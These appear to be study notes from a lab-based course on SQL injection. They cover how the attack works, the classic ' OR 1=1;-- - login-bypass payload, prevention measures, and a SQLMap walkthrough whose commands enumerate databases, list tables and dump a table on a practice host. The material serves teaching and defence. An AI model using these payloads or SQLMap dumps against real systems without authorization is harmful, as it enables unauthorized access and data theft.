### **SQL Injection Vulnerability**

#### **What is SQL Injection?**
- A **vulnerability** that allows attackers to manipulate SQL queries sent to a database.
- Happens when user input is **not properly sanitized** or validated.
- Can lead to unauthorized access, data theft, or even full control of the database.


#### **How Does It Work?**

1. **Normal Query Example**:
   - Input:
     - Username: `John`
     - Password: `Un@detectable444`
   - Query:
     ```sql
     SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
     ```
   - Behavior:
     - The database checks if `John` exists with the password `Un@detectable444`.
     - If both match, the query succeeds; otherwise, it fails.

2. **Malicious Input Example**:
   - Input:
     - Username: `John`
     - Password: `abc' OR 1=1;-- -`
   - Query:
     ```sql
     SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
     ```
   - Behavior:
     - The attacker adds a condition (`OR 1=1`) that is always true.
     - The `-- -` comments out the rest of the query, making it ignore the original password check.
     - Result: The attacker logs in as `John` without knowing the correct password.


#### **Key Components of the Attack**
1. **Single Quote (`'`)**:
   - Closes the string in the query (e.g., `'abc'`).
   - Allows the attacker to inject additional SQL logic.

2. **Logical Operator (`OR 1=1`)**:
   - Adds a condition that is always true.
   - Ensures the query succeeds regardless of the actual password.

3. **Comment (`-- -`)**:
   - Ignores the remaining part of the query.
   - Prevents syntax errors caused by leftover code.

#### **Why Is This Dangerous?**
- Attackers can:
  - Bypass authentication (e.g., log in as any user).
  - Retrieve sensitive data (e.g., passwords, credit card info).
  - Modify or delete data (e.g., drop tables, change records).
  - Execute commands on the server (in severe cases).


#### **How to Prevent SQL Injection?**
1. **Use Prepared Statements (Parameterized Queries)**:
   - Example:
     ```sql
     SELECT * FROM users WHERE username = ? AND password = ?;
     ```
   - Prevents attackers from injecting malicious code.

2. **Validate and Sanitize Input**:
   - Ensure inputs match expected formats (e.g., no special characters like `'`).

3. **Limit Database Permissions**:
   - Restrict what the application can do in the database (e.g., read-only access).

4. **Use Web Application Firewalls (WAFs)**:
   - Detect and block suspicious SQL queries.

5. **Avoid Displaying Detailed Error Messages**:
   - Don’t reveal database structure or query details to users.

### **Remembering Tips**

Think of SQL injection like breaking into a locked door:
- **Normal Input**: Using the correct key to unlock the door.
- **SQL Injection**: Finding a hidden lever (`OR 1=1`) that bypasses the lock.
- **Prevention**: Adding strong locks (prepared statements) and alarms (input validation).

### **Summary**
- **SQL Injection** exploits poorly sanitized user input to manipulate database queries.
- Attackers use tricks like `OR 1=1` and `-- -` to bypass security.
- Prevention involves using **prepared statements**, validating input, and limiting database permissions.

---
---



### **Automated SQL Injection with SQLMap**


#### **What is SQLMap?**
- **SQLMap** is an automated tool to detect and exploit SQL injection vulnerabilities in web applications.
- Simplifies the process of finding and exploiting vulnerabilities.
- Available as a command-line tool in Linux (can be installed if not pre-installed).


#### **How to Use SQLMap**

1. **Interactive Wizard Mode**:
   - Use the `--wizard` flag for beginners.
   - SQLMap guides you step-by-step.
   - Example:
     ```bash
     sqlmap --wizard
     ```

2. **Basic Syntax**:
   - Test a URL for SQL injection:
     ```bash
     sqlmap -u <URL>
     ```
   - Example:
     ```bash
     sqlmap -u http://sqlmaptesting.thm/search/cat=1
     ```

3. **Extracting Database Information**:
   - **List all databases**:
     ```bash
     sqlmap -u <URL> --dbs
     ```
   - Example Output:
     ```
     [*] users
     [*] members
     ```

4. **Extracting Tables**:
   - List tables in a specific database:
     ```bash
     sqlmap -u <URL> -D <database_name> --tables
     ```
   - Example:
     ```bash
     sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
     ```

5. **Dumping Table Data**:
   - Extract records from a specific table:
     ```bash
     sqlmap -u <URL> -D <database_name> -T <table_name> --dump
     ```
   - Example:
     ```bash
     sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
     ```
   - Example Output:
     ```
     +---------------------+------------+---------+
     | Date                | name       | pass    |
     +---------------------+------------+---------+
     | 09/09/2024          | Thomas THM | testing |
     +---------------------+------------+---------+
     ```


#### **Types of SQL Injection Detected**
- **Boolean-Based Blind**:
  - Modifies queries with boolean expressions (e.g., `1=1`) to extract data.
- **Error-Based**:
  - Intentionally causes errors to gather information about the database.
- **Time-Based Blind**:
  - Uses delays (e.g., `SLEEP(5)`) to infer data.
- **UNION Query**:
  - Combines results of multiple queries to extract data.

#### **POST-Based Testing**
- For forms (e.g., login, registration), intercept the POST request using tools like Burp Suite.
- Save the intercepted request as a text file and use SQLMap:
  ```bash
  sqlmap -r intercepted_request.txt
  ```


#### **Why Use SQLMap?**
- Automates the detection and exploitation of SQL injection vulnerabilities.
- Saves time compared to manual testing.
- Provides detailed information about databases, tables, and records.


#### **Preventing SQL Injection**
- Use **prepared statements** or **parameterized queries**.
- Validate and sanitize user input.
- Limit database permissions.
- Use Web Application Firewalls (WAFs).


### **Remembering Tips**
Think of SQLMap as a "digital locksmith":
- It tests doors (URLs/forms) to see if they’re locked properly.
- If it finds a weak lock (vulnerability), it opens it and shows what’s inside (data).
- Always use this tool responsibly and only on systems you own or have permission to test.

### **Summary**
- **SQLMap** automates SQL injection detection and exploitation.
- Use flags like `--dbs`, `--tables`, and `--dump` to extract data.
- Supports both GET and POST-based testing.
- Helps identify vulnerabilities like boolean-based blind, error-based, and UNION queries.

